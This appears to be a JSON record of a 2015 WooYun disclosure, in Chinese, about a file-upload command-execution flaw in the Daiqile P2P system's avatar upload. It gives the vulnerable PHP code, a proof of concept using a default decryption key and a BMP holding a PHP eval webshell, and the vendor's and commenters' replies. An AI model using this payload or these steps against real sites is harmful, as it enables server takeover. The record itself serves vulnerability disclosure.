{"id": 73372, "wybug_id": "wooyun-2015-0144444", "wybug_title": "贷齐乐p2p系统存在任意命令执行漏洞", "wybug_corp": "chinaanhe.com", "wybug_author": "Xser", "wybug_date": "2015-10-01 21:48", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： RT 详细说明：  出现在用户上传头像那里跟踪文件plugins/avatar/avatar.class.php中\nfunction onuploadavatar() {\t\t\t\t@header(\"Expires: 0\");\t\t@header(\"Cache-Control: private, post-check=0, pre-check=0, max-age=0\", FALSE);\t\t@header(\"Pragma: no-cache\");\t\t//header(\"Content-type: application/xml; charset=utf-8\");\t\t\t\t$this->init_input($this->getgpc('agent', 'G'));\t\t$uid = $this->input('uid');\t\tif(empty($uid)) {\t\t\treturn -1;\t\t}\t\tif(empty($_FILES['Filedata'])) {\t\t\treturn -3;\t\t}\t\tlist($width, $height, $type, $attr) = getimagesize($_FILES['Filedata']['tmp_name']);\t\t$imgtype = array(1 => '.gif', 2 => '.jpg', 3 => '.png');\t\t$filetype = $imgtype[$type];\t\t$tmpavatar = AVATAR_DATADIR.'./tmp/upload'.$uid.$filetype;\t\tfile_exists($tmpavatar) && @unlink($tmpavatar);\t\tif(@copy($_FILES['Filedata']['tmp_name'], $tmpavatar) || @move_uploaded_file($_FILES['Filedata']['tmp_name'], $tmpavatar)) {\t\t\t@unlink($_FILES['Filedata']['tmp_name']);\t\t\tlist($width, $height, $type, $attr) = getimagesize($tmpavatar);\t\t\tif($width < 10 || $height < 10 || $type == 4) {\t\t\t\t@unlink($tmpavatar);\t\t\t\treturn -2;\t\t\t}\t\t} else {\t\t\t@unlink($_FILES['Filedata']['tmp_name']);\t\t\treturn -4;\t\t}\t\t$avatarurl = AVATAR_DATAURL.'/tmp/upload'.$uid.$filetype;\t\treturn $avatarurl;\t}\n\n$tmpavatar = AVATAR_DATADIR.'./tmp/upload'.$uid.$filetype;\n$uid.$filetype这个两个参数拼合了如果可控就可以getshell，我们跟踪看看是否可控uid\n$uid = $this->input('uid');\nfiletype\n$filetype = $imgtype[$type];\n跟踪input\nfunction input($k) {\t\treturn isset($this->input[$k]) ? (is_array($this->input[$k]) ? $this->input[$k] : trim($this->input[$k])) : NULL;\t}\tfunction init_input($getagent = '') {\t\t$input = $this->getgpc('input', 'R');\t\t\t\tif($input) {\t\t\t$input = $this->authcode($input, 'DECODE', 'deck');\t\t\t\t\t\tparse_str($input, $this->input);\t\t\t$this->input = $this->daddslashes($this->input, 1, TRUE);\t\t\t$agent = $getagent ? $getagent : $this->input['agent'];\t\t\tif(($getagent && $getagent != $this->input['agent']) || (!$getagent && md5($_SERVER['HTTP_USER_AGENT']) != $agent)) {\t\t\t\texit('Access denied for agent changed');\t\t\t} elseif($this->time - $this->input('time') > 3600) {\t\t\t\texit('Authorization has expired');\t\t\t}\t\t}\t\tif(empty($this->input)) {\t\t\texit('Invalid input');\t\t}\t}\n看到init_input函数是获取input的值\n$input = $this->authcode($input, 'DECODE', 'deck');\n这里用了默认的deck密匙解密POC构造：$uid = (解码后)1.php && 一个包含<?php @eval($_POST[a]); ?>的BMP图片。调用默认加密过程将特殊的$uid转换为base64，然后直接向http://website/?user&inajax=1&a=uploadavatar&appid=1&input={xxxxxxxxx}&agent=hahahahahahah&avatartype=virtual提交上传请求然后访问\n\n   漏洞证明：  出现在用户上传头像那里跟踪文件plugins/avatar/avatar.class.php中\nfunction onuploadavatar() {\t\t\t\t@header(\"Expires: 0\");\t\t@header(\"Cache-Control: private, post-check=0, pre-check=0, max-age=0\", FALSE);\t\t@header(\"Pragma: no-cache\");\t\t//header(\"Content-type: application/xml; charset=utf-8\");\t\t\t\t$this->init_input($this->getgpc('agent', 'G'));\t\t$uid = $this->input('uid');\t\tif(empty($uid)) {\t\t\treturn -1;\t\t}\t\tif(empty($_FILES['Filedata'])) {\t\t\treturn -3;\t\t}\t\tlist($width, $height, $type, $attr) = getimagesize($_FILES['Filedata']['tmp_name']);\t\t$imgtype = array(1 => '.gif', 2 => '.jpg', 3 => '.png');\t\t$filetype = $imgtype[$type];\t\t$tmpavatar = AVATAR_DATADIR.'./tmp/upload'.$uid.$filetype;\t\tfile_exists($tmpavatar) && @unlink($tmpavatar);\t\tif(@copy($_FILES['Filedata']['tmp_name'], $tmpavatar) || @move_uploaded_file($_FILES['Filedata']['tmp_name'], $tmpavatar)) {\t\t\t@unlink($_FILES['Filedata']['tmp_name']);\t\t\tlist($width, $height, $type, $attr) = getimagesize($tmpavatar);\t\t\tif($width < 10 || $height < 10 || $type == 4) {\t\t\t\t@unlink($tmpavatar);\t\t\t\treturn -2;\t\t\t}\t\t} else {\t\t\t@unlink($_FILES['Filedata']['tmp_name']);\t\t\treturn -4;\t\t}\t\t$avatarurl = AVATAR_DATAURL.'/tmp/upload'.$uid.$filetype;\t\treturn $avatarurl;\t}\n\n$tmpavatar = AVATAR_DATADIR.'./tmp/upload'.$uid.$filetype;\n$uid.$filetype这个两个参数拼合了如果可控就可以getshell，我们跟踪看看是否可控uid\n$uid = $this->input('uid');\nfiletype\n$filetype = $imgtype[$type];\n跟踪input\nfunction input($k) {\t\treturn isset($this->input[$k]) ? (is_array($this->input[$k]) ? $this->input[$k] : trim($this->input[$k])) : NULL;\t}\tfunction init_input($getagent = '') {\t\t$input = $this->getgpc('input', 'R');\t\t\t\tif($input) {\t\t\t$input = $this->authcode($input, 'DECODE', 'deck');\t\t\t\t\t\tparse_str($input, $this->input);\t\t\t$this->input = $this->daddslashes($this->input, 1, TRUE);\t\t\t$agent = $getagent ? $getagent : $this->input['agent'];\t\t\tif(($getagent && $getagent != $this->input['agent']) || (!$getagent && md5($_SERVER['HTTP_USER_AGENT']) != $agent)) {\t\t\t\texit('Access denied for agent changed');\t\t\t} elseif($this->time - $this->input('time') > 3600) {\t\t\t\texit('Authorization has expired');\t\t\t}\t\t}\t\tif(empty($this->input)) {\t\t\texit('Invalid input');\t\t}\t}\n看到init_input函数是获取input的值\n$input = $this->authcode($input, 'DECODE', 'deck');\n这里用了默认的deck密匙解密POC构造：$uid = (解码后)1.php && 一个包含<?php @eval($_POST[a]); ?>的BMP图片。调用默认加密过程将特殊的$uid转换为base64，然后直接向http://website/?user&inajax=1&a=uploadavatar&appid=1&input={xxxxxxxxx}&agent=hahahahahahah&avatartype=virtual提交上传请求然后访问\n\n   修复方案：     版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-10-02 10:52 厂商回复： 测试这个版本应该是贷齐乐盗版或者是贷齐乐12年版本，请测试官方正式版，否则请不要以贷齐乐版本命名 最新状态： 2015-10-02：\tonuploadavatar() 这个函数已经不是这么写的了，具体请测试宁波贷  ", "replys": "漏洞评价：\n评价\n     2015-10-01 21:50 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  牛的一比    \n     2015-10-01 21:54 |    \t\t玉林嘎  \t\t\t( 核心白帽子 |\t\t\t        Rank:915 漏洞数:105        )\t\t \n  可怕.    \n     2015-10-01 22:00 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:262 漏洞数:67        | baozisec)\t\t \n  5K get√    \n     2015-10-01 22:04 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:365 漏洞数:83        | JDSec)\t\t \n  我一直想要融都的源码其实p2p系统是三巨头，融都是阿里投资的，一直没人挖@牛肉包子@玉林嘎    \n     2015-10-02 00:00 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:48        | 人如果没有梦想，跟咸鱼有什么分别)\t\t \n  牛的一比    \n     2015-10-02 07:28 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1841 漏洞数:292        | HackBraid昵称的由来是一款名为Braid的游戏...)\t\t \n  屌屌屌    \n     2015-10-02 11:02 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1841 漏洞数:292        | HackBraid昵称的由来是一款名为Braid的游戏...)\t\t \n  嗯，知道是哪个漏洞了，帝友也出现过    \n     2015-10-02 11:49 |    \t\t′雨。  \t\t\t( 普通白帽子  |\t\t\t        Rank:1268 漏洞数:193        | Only Code Never Lie To Me.)\t\t \n  嗯 看过这个，  应该挺久以前的版本，uid就有是不是数字的检测， 还有各种其他蛋疼的检测。。    \n     2015-10-02 13:04 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:262 漏洞数:67        | baozisec)\t\t \n  我也知道了  新版的早就检测了    \n     2015-10-06 10:19 |    \t\tsecgov \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 安全审计，漏洞挖掘,WAF. 提醒大家揭露漏洞...)\t\t \n  实在对贷气乐无语了    \n     2016-01-12 12:31 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | )(2009年荣获CCAV首届挖洞大使称号)(★★★...)\t\t \n  牛逼的不要不要的！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}